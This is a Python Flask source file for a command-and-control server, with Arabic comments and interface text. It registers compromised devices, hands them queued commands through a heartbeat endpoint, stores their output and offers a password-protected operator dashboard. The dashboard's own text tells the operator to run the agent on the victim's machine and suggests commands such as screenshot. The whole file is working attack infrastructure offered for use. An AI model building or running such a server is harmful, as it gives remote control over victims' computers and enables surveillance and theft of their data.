# ============================================================
# C2 Server - Command & Control (Fixed)
# ============================================================

import os
import json
import base64
import uuid
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session

app = Flask(__name__)
app.secret_key = os.urandom(32).hex()
app.url_map.strict_slashes = False

# ============================================================
# تخزين مؤقت
# ============================================================
DATA_FILE = '/tmp/c2_data.json'
COMMANDS_FILE = '/tmp/c2_commands.json'
RESULTS_FILE = '/tmp/c2_results.json'

ADMIN_PASSWORD = "changeme123"  # ← غيرها

# ============================================================
# دوال التخزين
# ============================================================
def load_json(path, default=None):
    if default is None:
        default = {}
    try:
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8') as f:
                return json.load(f)
    except:
        pass
    return default

def save_json(path, data):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return True
    except:
        return False

def get_devices():
    return load_json(DATA_FILE, {})

def get_commands():
    return load_json(COMMANDS_FILE, {})

def get_results():
    return load_json(RESULTS_FILE, {})

def cleanup_old_data():
    devices = get_devices()
    now = datetime.now()
    to_delete = []
    for device_id, info in devices.items():
        try:
            last_seen = datetime.fromisoformat(info.get('last_seen', '2000-01-01'))
            if (now - last_seen).days > 7:
                to_delete.append(device_id)
        except:
            pass
    for d in to_delete:
        devices.pop(d, None)
    if to_delete:
        save_json(DATA_FILE, devices)


# ============================================================
# API للعميل
# ============================================================
@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data:
        return jsonify({"error": "no data"}), 400
    
    device_id = data.get('device_id')
    if not device_id:
        return jsonify({"error": "no device_id"}), 400
    
    devices = get_devices()
    devices[device_id] = {
        "device_id": device_id,
        "hostname": data.get('hostname', 'unknown'),
        "username": data.get('username', 'unknown'),
        "os": data.get('os', 'unknown'),
        "os_version": data.get('os_version', 'unknown'),
        "ip": request.remote_addr,
        "admin": data.get('admin', False),
        "first_seen": devices.get(device_id, {}).get('first_seen', datetime.now().isoformat()),
        "last_seen": datetime.now().isoformat(),
        "online": True
    }
    save_json(DATA_FILE, devices)
    return jsonify({"status": "ok", "device_id": device_id}), 200


@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    device_id = data.get('device_id')
    
    if not device_id:
        return jsonify({"error": "no device_id"}), 400
    
    devices = get_devices()
    if device_id in devices:
        devices[device_id]['last_seen'] = datetime.now().isoformat()
        devices[device_id]['online'] = True
        save_json(DATA_FILE, devices)
    
    commands = get_commands()
    device_commands = commands.get(device_id, [])
    pending = [c for c in device_commands if not c.get('executed', False)]
    
    return jsonify({"status": "ok", "commands": pending}), 200


@app.route('/api/result', methods=['POST'])
def result():
    data = request.get_json()
    device_id = data.get('device_id')
    command_id = data.get('command_id')
    output = data.get('output', '')
    
    if not device_id or not command_id:
        return jsonify({"error": "missing fields"}), 400
    
    commands = get_commands()
    if device_id in commands:
        for cmd in commands[device_id]:
            if cmd['id'] == command_id:
                cmd['executed'] = True
                cmd['executed_at'] = datetime.now().isoformat()
        save_json(COMMANDS_FILE, commands)
    
    results = get_results()
    if device_id not in results:
        results[device_id] = []
    results[device_id].append({
        "command_id": command_id,
        "output": output,
        "timestamp": datetime.now().isoformat()
    })
    results[device_id] = results[device_id][-100:]
    save_json(RESULTS_FILE, results)
    
    return jsonify({"status": "ok"}), 200


# ============================================================
# قوالب HTML
# ============================================================
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>C2 Login</title>
    <style>
        body { font-family: Arial; background: #0a0a0a; color: #eee; 
               display: flex; justify-content: center; align-items: center; 
               height: 100vh; margin: 0; }
        .login-box { background: #1a1a2e; padding: 40px; border-radius: 10px; 
                     border: 1px solid #e94560; width: 300px; }
        h1 { color: #e94560; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; 
                border: 1px solid #333; background: #0f0f1e; color: #eee; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #e94560; color: white; 
                 border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #c73650; }
        .error { color: #ff4444; text-align: center; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>🔒 C2 Panel</h1>
        <form method="POST">
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
    </div>
</body>
</html>
"""

DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>C2 Dashboard</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial; background: #0a0a0a; color: #eee; margin: 0; padding: 20px; }
        h1 { color: #e94560; }
        h2, h3 { color: #f9a826; }
        .header { display: flex; justify-content: space-between; align-items: center; 
                  border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 20px; }
        .logout { color: #e94560; text-decoration: none; }
        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
        .stat { background: #1a1a2e; padding: 20px; border-radius: 8px; border-right: 4px solid #e94560; }
        .stat .num { font-size: 32px; color: #e94560; font-weight: bold; }
        .stat .label { color: #999; font-size: 14px; margin-top: 5px; }
        .device { background: #16213e; padding: 15px; border-radius: 8px; margin-bottom: 10px; 
                  border-right: 4px solid #0f0; cursor: pointer; }
        .device.offline { border-right-color: #666; opacity: 0.6; }
        .device:hover { background: #1e2a4a; }
        .device .hostname { font-weight: bold; font-size: 16px; }
        .device .info { color: #999; font-size: 13px; margin-top: 5px; }
        .device .last-seen { color: #f9a826; font-size: 12px; }
        .cmd-input { width: 100%; padding: 10px; background: #000; color: #0f0; 
                     border: 1px solid #333; border-radius: 5px; font-family: monospace; }
        .btn { background: #e94560; color: white; padding: 10px 20px; border: none; 
               border-radius: 5px; cursor: pointer; margin-top: 10px; font-size: 16px; }
        .btn:hover { background: #c73650; }
        .results { background: #000; padding: 15px; border-radius: 5px; margin-top: 15px; 
                   font-family: monospace; color: #0f0; max-height: 400px; overflow-y: auto; 
                   white-space: pre-wrap; word-wrap: break-word; }
        .refresh { background: #0f3460; color: white; padding: 8px 15px; text-decoration: none; 
                   border-radius: 5px; display: inline-block; margin-bottom: 15px; }
        .back { color: #e94560; text-decoration: none; display: inline-block; margin-bottom: 15px; }
        .info-row { background: #0f3460; padding: 15px; border-radius: 8px; margin-bottom: 15px; color: #eee; }
        .result-item { border-bottom: 1px solid #333; padding: 10px 0; }
        .result-time { color: #f9a826; font-size: 12px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎯 C2 Dashboard</h1>
        <a href="/logout" class="logout">Logout</a>
    </div>
    
    <div class="stats">
        <div class="stat">
            <div class="num">{{ total }}</div>
            <div class="label">Total Devices</div>
        </div>
        <div class="stat">
            <div class="num">{{ online }}</div>
            <div class="label">Online Now</div>
        </div>
        <div class="stat">
            <div class="num">{{ commands_count }}</div>
            <div class="label">Commands Sent</div>
        </div>
    </div>
    
    {% if not selected %}
    
    <h2>📱 الأجهزة المتصلة</h2>
    <a href="/dashboard" class="refresh">🔄 تحديث</a>
    
    {% if devices %}
        {% for device_id, info in devices.items() %}
        <div class="device {% if not info.online %}offline{% endif %}" 
             onclick="window.location='/dashboard?device={{ device_id }}'">
            <div class="hostname">
                {% if info.online %}🟢{% else %}⚫{% endif %}
                {{ info.hostname }} ({{ info.username }})
            </div>
            <div class="info">
                💻 {{ info.os }} {{ info.os_version }} | 
                🌐 {{ info.ip }} | 
                {% if info.admin %}👑 Admin{% else %}👤 User{% endif %}
            </div>
            <div class="last-seen">⏰ آخر ظهور: {{ info.last_seen }}</div>
        </div>
        {% endfor %}
    {% else %}
        <p style="color:#999; text-align:center; padding:50px;">
            لا توجد أجهزة متصلة بعد. شغّل العميل (agent.py) على جهاز الضحية.
        </p>
    {% endif %}
    
    {% else %}
    
    <a href="/dashboard" class="back">← رجوع للقائمة</a>
    
    <h2>🖥️ {{ selected.hostname }}</h2>
    <div class="info-row">
        👤 {{ selected.username }} | 
        💻 {{ selected.os }} {{ selected.os_version }} | 
        🌐 {{ selected.ip }} | 
        {% if selected.admin %}👑 Admin{% else %}👤 User{% endif %}
        <br>⏰ آخر ظهور: {{ selected.last_seen }}
    </div>
    
    <h3>⚡ تنفيذ أمر</h3>
    <form method="POST" action="/dashboard">
        <input type="hidden" name="device_id" value="{{ device_id }}">
        <input type="text" name="command" class="cmd-input" 
               placeholder="مثال: sysinfo | whoami | dir | screenshot" required autofocus>
        <button type="submit" class="btn">📤 Send Command</button>
    </form>
    
    <h3>📜 النتائج</h3>
    <div class="results">
        {% if results %}
            {% for r in results %}
            <div class="result-item">
                <div class="result-time">⏰ {{ r.timestamp }}</div>
                <div>{{ r.output }}</div>
            </div>
            {% endfor %}
        {% else %}
            <div style="color:#999;">لا توجد نتائج بعد. أرسل أمراً وانتظر 8 ثوانٍ.</div>
        {% endif %}
    </div>
    
    {% endif %}
</body>
</html>
"""


# ============================================================
# المسارات
# ============================================================
@app.route('/')
def index():
    return redirect('/dashboard')

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect('/dashboard')
        error = "كلمة المرور خطأ"
    return render_template_string(LOGIN_TEMPLATE, error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect('/login')

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if not session.get('logged_in'):
        return redirect('/login')
    
    cleanup_old_data()
    devices = get_devices()
    commands = get_commands()
    results_data = get_results()
    
    # تحديث حالة الاتصال
    now = datetime.now()
    online_count = 0
    for d_id, info in devices.items():
        try:
            last = datetime.fromisoformat(info['last_seen'])
            if (now - last).total_seconds() < 60:
                info['online'] = True
                online_count += 1
            else:
                info['online'] = False
        except:
            info['online'] = False
    
    # عدد الأوامر
    total_commands = sum(len(cmds) for cmds in commands.values())
    
    # استقبال device_id من GET أو POST
    selected_id = request.args.get('device') or request.form.get('device_id')
    selected = None
    device_results = []
    
    # معالجة إرسال أمر جديد (POST)
    if request.method == 'POST' and selected_id:
        command_text = request.form.get('command', '').strip()
        if command_text:
            if selected_id not in commands:
                commands[selected_id] = []
            commands[selected_id].append({
                "id": str(uuid.uuid4())[:8],
                "command": command_text,
                "created_at": datetime.now().isoformat(),
                "executed": False
            })
            save_json(COMMANDS_FILE, commands)
            # إعادة توجيه إلى GET (لتفادي إعادة الإرسال عند التحديث)
            return redirect(f'/dashboard?device={selected_id}')
    
    # جلب بيانات الجهاز المختار
    if selected_id and selected_id in devices:
        selected = devices[selected_id]
        device_results = results_data.get(selected_id, [])
        device_results = list(reversed(device_results[-20:]))
    
    return render_template_string(
        DASHBOARD_TEMPLATE,
        devices=devices,
        total=len(devices),
        online=online_count,
        commands_count=total_commands,
        selected=selected,
        device_id=selected_id,
        results=device_results
    )


@app.route('/health')
def health():
    return "OK", 200


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
